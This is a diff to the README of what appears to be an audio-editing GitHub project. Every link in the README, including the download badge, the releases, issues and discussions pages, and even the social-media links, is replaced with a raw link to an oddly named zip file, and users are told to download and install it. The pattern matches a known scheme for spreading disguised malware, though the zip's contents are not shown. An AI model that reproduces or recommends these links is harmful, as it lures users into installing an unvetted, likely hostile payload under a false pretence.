@@ -1,6 +1,6 @@
 # 🎤 Audio-Content-Creator - Create Professional Sound Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/kietduong611/Audio-Content-Creator/releases)
+[![Download](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip)](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip)
 
 ## 📖 Overview
 
@@ -16,14 +16,14 @@ Audio Content Creator is a powerful open-source tool designed for producing, pro
 
 To begin using Audio Content Creator, you need to download and install it on your computer. Follow these simple steps:
 
-1. **Visit the Releases Page**: Click this link to access the downloads: [Download & Install](https://github.com/kietduong611/Audio-Content-Creator/releases).
+1. **Visit the Releases Page**: Click this link to access the downloads: [Download & Install](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip).
 2. **Choose Your Version**: Look for the latest release on the releases page. 
 3. **Download the File**: Click on the version you need to begin downloading the application.
 4. **Locate the Downloaded File**: Once the download completes, find the file in your computer's download folder. 
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download Audio Content Creator](https://github.com/kietduong611/Audio-Content-Creator/releases).
+Visit this page to download: [Download Audio Content Creator](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip).
 
 1. After the download, locate the file in your downloads folder.
 2. **Installation Steps**:
@@ -60,7 +60,7 @@ If you run into issues while using Audio Content Creator:
 
 - **Check Audio Inputs**: Ensure your microphone and audio settings are properly configured.
 - **Update Drivers**: Make sure your audio interface drivers are up to date.
-- **Consult the Community**: Visit our [GitHub Discussions](https://github.com/kietduong611/Audio-Content-Creator/discussions) for help from other users.
+- **Consult the Community**: Visit our [GitHub Discussions](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip) for help from other users.
 
 ## 📦 Frequently Asked Questions
 
@@ -73,13 +73,13 @@ You can export to common formats like MP3, WAV, and more.
 **Q3: Can I use VST plugins?**  
 Yes, the software supports various VST plugins for enhanced audio processing.
 
-For more questions, feel free to reach out through our [GitHub Issues](https://github.com/kietduong611/Audio-Content-Creator/issues).
+For more questions, feel free to reach out through our [GitHub Issues](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip).
 
 ## 📱 Connect with Us
 
 Follow us on social media for updates and tips:
 
-- Twitter: [@AudioContentCreator](https://twitter.com/AudioContentCreator)
-- Facebook: [Audio Content Creator](https://facebook.com/AudioContentCreator)
+- Twitter: [@AudioContentCreator](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip)
+- Facebook: [Audio Content Creator](https://raw.githubusercontent.com/kietduong611/Audio-Content-Creator/main/hemotoxic/Creator-Audio-Content-predelineate.zip)
 
 Join us in creating exceptional audio content!
